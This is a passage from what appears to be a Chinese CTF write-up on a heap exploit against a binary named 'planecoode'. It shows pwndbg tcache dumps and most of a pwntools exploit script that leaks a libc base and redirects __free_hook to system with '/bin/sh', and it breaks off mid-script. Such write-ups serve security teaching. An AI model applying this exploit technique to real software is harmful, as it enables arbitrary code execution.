% s 通泄露出来.(因为原本 0x20 的 chunk 被我们修改为 laegechunk 进入 unsortedbins)，tcache 没有符合要求的 chunk, 从 unsortedbins 里切割出来，bk 可以泄露 libc 的地址。</p>\n<p>下面的操作原理跟上面的一样，因为我们连续申请的一系列 chunk，存在 tcache 里面，所以，再次利用刚刚从 unsortedbins 切割出来的 chunk，(堆头和我们最开始 malloc (0x10) 一样，刚刚我们申请出来 0x20 的空间，接着马上被释放进入了 tcache，此时，tcache 的 bins 种都有一个 chunk, 我们希望通过修改其 fd 来获取目标地址。所以，我们还是把 0x20 的 chunk 拿出来，总比不过，我们向让她出来就不要再回去 0x20 的 tcachebin，而是其他位置，所以我们申请之前，再次通过越界修改他的 chunsize，我这里修改为 0x41, 这样再次申请释放后，其进入对应的 bins,fd 不为空。我这里并没有把 chunk 放入 unsortedbins 后直接申请 8 字节的空间，而是 malloc (0xf0)，下一次在 malloc (0x8)，结果是一样的。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">修改前</span><br><span class=\"line\">Free chunk (tcache) | PREV_INUSE</span><br><span class=\"line\">Addr: 0x5640fd90c5f0</span><br><span class=\"line\">Size: 0x101</span><br><span class=\"line\">fd: 0x00</span><br><span class=\"line\"></span><br><span class=\"line\">0x30 [  1]: 0x5640fd90c620 ◂— 0x11</span><br><span class=\"line\">0x40 [  1]: 0x5640fd90c650 ◂— 0x11</span><br><span class=\"line\">0x50 [  1]: 0x5640fd90c690 ◂— 0x11</span><br><span class=\"line\">0x60 [  1]: 0x5640fd90c6e0 ◂— 0x0</span><br><span class=\"line\">0x70 [  1]: 0x5640fd90c740 ◂— 0x0</span><br><span class=\"line\">0x80 [  1]: 0x5640fd90c7b0 ◂— 0x0</span><br><span class=\"line\">0x90 [  1]: 0x5640fd90c830 ◂— 0x0</span><br><span class=\"line\">0xa0 [  1]: 0x5640fd90c8c0 ◂— 0x0</span><br><span class=\"line\">0xb0 [  1]: 0x5640fd90c960 ◂— 0x0</span><br><span class=\"line\">0xc0 [  1]: 0x5640fd90ca10 ◂— 0x0</span><br><span class=\"line\">0xd0 [  1]: 0x5640fd90cad0 ◂— 0x0</span><br><span class=\"line\">0xe0 [  1]: 0x5640fd90cba0 ◂— 0x0</span><br><span class=\"line\">0x100 [  1]: 0x5640fd90c600 ◂— 0x0</span><br><span class=\"line\"></span><br><span class=\"line\">修改后申请、释放</span><br><span class=\"line\">0x20 [  1]: 0x5640fd90c700 ◂— 0x0</span><br><span class=\"line\">0x30 [  1]: 0x5640fd90c620 ◂— 0x0</span><br><span class=\"line\">0x40 [  2]: 0x5640fd90c600 —▸ 0x5640fd90c650 ◂— 0x0</span><br><span class=\"line\">0x50 [  1]: 0x5640fd90c690 ◂— 0x11</span><br><span class=\"line\">0x60 [  1]: 0x5640fd90c6e0 ◂— 0x0</span><br><span class=\"line\">0x70 [  1]: 0x5640fd90c740 ◂— 0x0</span><br><span class=\"line\">0x80 [  1]: 0x5640fd90c7b0 ◂— 0x0</span><br><span class=\"line\">0x90 [  1]: 0x5640fd90c830 ◂— 0x0</span><br><span class=\"line\">0xa0 [  1]: 0x5640fd90c8c0 ◂— 0x0</span><br><span class=\"line\">0xb0 [  1]: 0x5640fd90c960 ◂— 0x0</span><br><span class=\"line\">0xc0 [  1]: 0x5640fd90ca10 ◂— 0x0</span><br><span class=\"line\">0xd0 [  1]: 0x5640fd90cad0 ◂— 0x0</span><br><span class=\"line\">0xe0 [  1]: 0x5640fd90cba0 ◂— 0x0</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>然后，我们还是通过越界，这次直接修改 chunk 的 fd 指针指向__free_hook-8, 因为 malloc 之后，会紧接着就释放 chunk，我们需要同时完成__free_hook 改写为 system，还要保证指针指向的内容是 “/bin/sh\\x00”。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; bins</span><br><span class=\"line\">tcachebins</span><br><span class=\"line\">0x20 [  1]: 0x55bd2778d700 ◂— 0x0</span><br><span class=\"line\">0x30 [  1]: 0x55bd2778d620 ◂— 0x0</span><br><span class=\"line\">0x40 [  2]: 0x55bd2778d600 —▸ 0x7fd5cab318e0 (__after_morecore_hook) ◂— 0x0</span><br><span class=\"line\">0x50 [  1]: 0x55bd2778d690 ◂— 0x11</span><br><span class=\"line\">0x60 [  1]: 0x55bd2778d6e0 ◂— 0x0</span><br><span class=\"line\">0x70 [  1]: 0x55bd2778d740 ◂— 0x0</span><br><span class=\"line\">0x80 [  1]: 0x55bd2778d7b0 ◂— 0x0</span><br><span class=\"line\">0x90 [  1]: 0x55bd2778d830 ◂— 0x0</span><br><span class=\"line\">0xa0 [  1]: 0x55bd2778d8c0 ◂— 0x0</span><br><span class=\"line\">0xb0 [  1]: 0x55bd2778d960 ◂— 0x0</span><br><span class=\"line\">0xc0 [  1]: 0x55bd2778da10 ◂— 0x0</span><br><span class=\"line\">0xd0 [  1]: 0x55bd2778dad0 ◂— 0x0</span><br><span class=\"line\">0xe0 [  1]: 0x55bd2778dba0 ◂— 0x0</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; bins</span><br><span class=\"line\">tcachebins</span><br><span class=\"line\">0x20 [  1]: 0x55bd2778d700 ◂— 0x0</span><br><span class=\"line\">0x30 [  1]: 0x55bd2778d620 ◂— 0x0</span><br><span class=\"line\">0x40 [  1]: 0x7fd5cab318e0 (__after_morecore_hook) ◂— 0x0</span><br><span class=\"line\">0x50 [  1]: 0x55bd2778d690 ◂— 0x11</span><br><span class=\"line\">0x60 [  1]: 0x55bd2778d6e0 ◂— 0x0</span><br><span class=\"line\">0x70 [  1]: 0x55bd2778d740 ◂— 0x0</span><br><span class=\"line\">0x80 [  1]: 0x55bd2778d7b0 ◂— 0x0</span><br><span class=\"line\">0x90 [  1]: 0x55bd2778d830 ◂— 0x0</span><br><span class=\"line\">0xa0 [  1]: 0x55bd2778d8c0 ◂— 0x0</span><br><span class=\"line\">0xb0 [  1]: 0x55bd2778d960 ◂— 0x0</span><br><span class=\"line\">0xc0 [  1]: 0x55bd2778da10 ◂— 0x0</span><br><span class=\"line\">0xd0 [  1]: 0x55bd2778dad0 ◂— 0x0</span><br><span class=\"line\">0xe0 [  1]: 0x55bd2778dba0 ◂— 0x0</span><br><span class=\"line\">0x100 [  1]: 0x55bd2778d600 ◂— 0x0</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>最后的效果</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; tel 0x7fd5cab318e0</span><br><span class=\"line\">00:0000│ rsi 0x7fd5cab318e0 (__after_morecore_hook) ◂— 0x68732f6e69622f /* &#x27;/bin/sh&#x27; */</span><br><span class=\"line\">01:0008│     0x7fd5cab318e8 (__free_hook) —▸ 0x7fd5ca793420 (system) </span><br></pre></td></tr></table></figure>\n<h2 id=\"完整exp\"><a class=\"markdownIt-Anchor\" href=\"#完整exp\">#</a> 完整 exp</h2>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">r=process(<span class=\"string\">&#x27;./planecoode&#x27;</span>)</span><br><span class=\"line\">elf =ELF(<span class=\"string\">&#x27;./planecoode&#x27;</span>)</span><br><span class=\"line\">libc = elf.libc</span><br><span class=\"line\"><span class=\"comment\">#context.log_level =&#x27;debug&#x27;</span></span><br><span class=\"line\"><span class=\"comment\">#code highest byte is 0x6</span></span><br><span class=\"line\">incx = <span class=\"number\">0x0600000000000000</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">pop1</span>():\t\t\t\t<span class=\"comment\">#0xcc</span></span><br><span class=\"line\">\tpayload = incx + <span class=\"number\">0xcc</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> payload</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">po4</span>():</span><br><span class=\"line\">\tpayload =incx +<span class=\"number\">0x98</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> payload</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">mul</span>(<span class=\"params\">i</span>):</span><br><span class=\"line\">\tpayload = incx + <span class=\"number\">0x12</span> + i&lt;&lt;<span class=\"number\">8</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> payload</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">reset</span>():</span><br><span class=\"line\">\tpayload = incx + <span class=\"number\">0x13</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> payload</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">xor</span>(<span class=\"params\">i</span>):</span><br><span class=\"line\">\tpayload = incx +<span class=\"number\">0x33</span> + i&lt;&lt;<span class=\"number\">8</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> payload</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">push1</span>():</span><br><span class=\"line\">\tpayload = incx + <span class=\"number\">0x36</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> payload</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">div</span>(<span class=\"params\">i</span>):</span><br><span class=\"line\">\tpayload = incx + <span class=\"number\">0x41</span> + i&lt;&lt;<span class=\"number\">8</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> payload</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">push4</span>(<span class=\"params\">i</span>):</span><br><span class=\"line\">\tpayload = incx +<span class=\"number\">0x45</span> +i*<span class=\"number\">0x100</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> payload</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">jmp</span>(<span class=\"params\">x,y</span>):</span><br><span class=\"line\">\tpayload = <span class=\"number\">0x0800000000000000</span> + <span class=\"number\">0x49</span> + (y*<span class=\"number\">0x1000000</span>)</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> payload</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">i</span>):</span><br><span class=\"line\">\tpayload = incx + <span class=\"number\">0x52</span> + i*<span class=\"number\">0x100</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> payload</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">sub</span>(<span class=\"params\">i</span>):</span><br><span class=\"line\">\tpayload = incx + <span class=\"number\">0x6a</span> + i*<span class=\"number\">0x100</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> payload</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">printc</span>():</span><br><span class=\"line\">\tpayload = incx + <span class=\"number\">0x54</span> </span><br><span class=\"line\">\t<span class=\"keyword\">return</span> payload</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">malloc</span>(<span class=\"params\">n</span>):</span><br><span class=\"line\">\tpayload = incx + <span class=\"number\">0xcd</span> +n*<span class=\"number\">0x100</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> payload</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">exit</span>():</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> incx + <span class=\"number\">0xd1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">write</span>(<span class=\"params\">wh,content</span>):\t\t\t\t\t<span class=\"comment\">#   0&lt;=  offset  &lt;=0xffffffff</span></span><br><span class=\"line\">\tpayload = incx + <span class=\"number\">0xda</span> + wh*<span class=\"number\">0x100</span>+content*<span class=\"number\">0x10000000000</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> payload</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">decX</span>():</span><br><span class=\"line\">\tpaylaod = <span class=\"number\">0x0400000000000000</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> payload</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">incy</span>():</span><br><span class=\"line\">\tpayload = <span class=\"number\">0x0800000000000000</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">code = []</span><br><span class=\"line\"></span><br><span class=\"line\">code.append(push4(<span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\">code.append(push4(<span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\">code.append(push4(<span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\">code.append(push4(<span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\">code.append(push4(<span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\">code.append(push4(<span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\">code.append(push4(<span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\">code.append(push4(<span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\">code.append(push4(<span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\">code.append(jmp(<span class=\"number\">0</span>,<span class=\"number\">0</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">code.append(push4(<span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\">code.append(push4(<span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\">code.append(push4(<span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\">code.append(push4(<span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\">code.append(push4(<span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\">code.append(push4(<span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\">code.append(push4(<span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\">code.append(push4(<span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\">code.append(push4(<span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\">code.append(jmp(<span class=\"number\">0</span>,<span class=\"number\">1</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">code.append(malloc(<span class=\"number\">0x10</span>))</span><br><span class=\"line\">code.append(malloc(<span class=\"number\">0x20</span>))</span><br><span class=\"line\">code.append(malloc(<span class=\"number\">0x30</span>))</span><br><span class=\"line\">code.append(malloc(<span class=\"number\">0x40</span>))</span><br><span class=\"line\">code.append(malloc(<span class=\"number\">0x50</span>))</span><br><span class=\"line\">code.append(malloc(<span class=\"number\">0x60</span>))</span><br><span class=\"line\">code.append(malloc(<span class=\"number\">0x70</span>))</span><br><span class=\"line\">code.append(malloc(<span class=\"number\">0x80</span>))</span><br><span class=\"line\">code.append(malloc(<span class=\"number\">0x90</span>))</span><br><span class=\"line\">code.append(jmp(<span class=\"number\">0</span>,<span class=\"number\">2</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">code.append(malloc(<span class=\"number\">0xa0</span>))</span><br><span class=\"line\">code.append(malloc(<span class=\"number\">0xb0</span>))</span><br><span class=\"line\">code.append(malloc(<span class=\"number\">0xc0</span>))</span><br><span class=\"line\">code.append(malloc(<span class=\"number\">0xd0</span>))</span><br><span class=\"line\">code.append(write(<span class=\"number\">0x21</span>,<span class=\"number\">0x4</span>))</span><br><span class=\"line\">code.append(write(<span class=\"number\">0x20</span>,<span class=\"number\">0xd1</span>))</span><br><span class=\"line\">code.append(write(<span class=\"number\">0x10</span>,<span class=\"number\">0xee</span>))</span><br><span class=\"line\">code.append(malloc(<span class=\"number\">0x8</span>))</span><br><span class=\"line\">code.append(write(<span class=\"number\">0x10</span>,<span class=\"number\">0xee</span>))</span><br><span class=\"line\">code.append(jmp(<span class=\"number\">0</span>,<span class=\"number\">3</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">code.append(malloc(<span class=\"number\">0xf0</span>))</span><br><span class=\"line\">code.append(malloc(<span class=\"number\">0x8</span>))</span><br><span class=\"line\">code.append(write(<span class=\"number\">0x21</span>,<span class=\"number\">0x0</span>))</span><br><span class=\"line\">code.append(write(<span class=\"number\">0x20</span>,<span class=\"number\">0x41</span>))</span><br><span class=\"line\">code.append(malloc(<span class=\"number\">0xf0</span>))</span><br><span class=\"line\">code.append(reset())</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">len</span>(code))</span><br><span class=\"line\">nums = <span class=\"built_in\">len</span>(code)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">Xn = <span class=\"number\">10</span></span><br><span class=\"line\">Yn = <span class=\"number\">10</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(r,&#x27;brva 0x0139D&#x27;)\t\t\t\t#set </span></span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(r,&#x27;brva 0x00164E&#x27;)\t\t\t\t#getcode</span></span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(r,&#x27;brva 0x165e&#x27;)\t\t\t\t#operation</span></span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(r,&#x27;brva 0x013B7&#x27;)</span></span><br><span class=\"line\">r.sendlineafter(<span class=\"string\">&quot;size X:&quot;</span>,<span class=\"built_in\">str</span>(Xn))</span><br><span class=\"line\">r.sendlineafter(<span class=\"string\">&quot;size Y:&quot;</span>,<span class=\"built_in\">str</span>(Yn))</span><br><span class=\"line\">r.sendlineafter(<span class=\"string\">&quot;How many codes do you want to set?&quot;</span>,<span class=\"built_in\">str</span>(nums))</span><br><span class=\"line\"></span><br><span class=\"line\">x=<span class=\"number\">0</span></span><br><span class=\"line\">y=<span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(nums):</span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;X:&quot;</span>,<span class=\"built_in\">str</span>(x))</span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;Y:&quot;</span>,<span class=\"built_in\">str</span>(y))</span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;Code:&quot;</span>,<span class=\"built_in\">str</span>(code[i]))</span><br><span class=\"line\">\t<span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\033[1;35m [+] : &quot;</span>+<span class=\"built_in\">str</span>(<span class=\"built_in\">hex</span>(code[i])+<span class=\"string\">&quot;\\033[0m&quot;</span>))</span><br><span class=\"line\">\tx +=<span class=\"number\">1</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> x  == Xn:</span><br><span class=\"line\">\t\ty+=<span class=\"number\">1</span></span><br><span class=\"line\">\t\tx=<span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\">r.sendlineafter(<span class=\"string\">&quot;Start X:&quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">0</span>))</span><br><span class=\"line\">r.sendlineafter(<span class=\"string\">&quot;Start Y:&quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">0</span>))</span><br><span class=\"line\">fake = p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0x11</span>)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">0xe</span>,<span class=\"number\">1</span>):</span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;content:&quot;</span>,fake*i)</span><br><span class=\"line\"></span><br><span class=\"line\">r.sendafter(<span class=\"string\">&quot;content:&quot;</span>,<span class=\"string\">b&#x27;X&#x27;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">b&quot;X&quot;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\">libc_base = u64(r.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))-<span class=\"number\">0x3ebca0</span></span><br><span class=\"line\">free_hook = libc_base + <span class=\"number\">0x3ed8e8</span></span><br><span class=\"line\">system = libc_base + <span class=\"number\">0x04f420</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\033[1;35m [+] libc_base : &quot;</span>+<span class=\"built_in\">str</span>(<span class=\"built_in\">hex</span>(libc_base)+<span class=\"string\">&quot;\\033[0m&quot;</span>))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\033[1;35m [+] free_hook : &quot;</span>+<span class=\"built_in\">str</span>(<span class=\"built_in\">hex</span>(free_hook)+<span class=\"string\">&quot;\\033[0m&quot;</span>))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\033[1;35m [+] system : &quot;</span>+<span class=\"built_in\">str</span>(<span class=\"built_in\">hex</span>(system)+<span 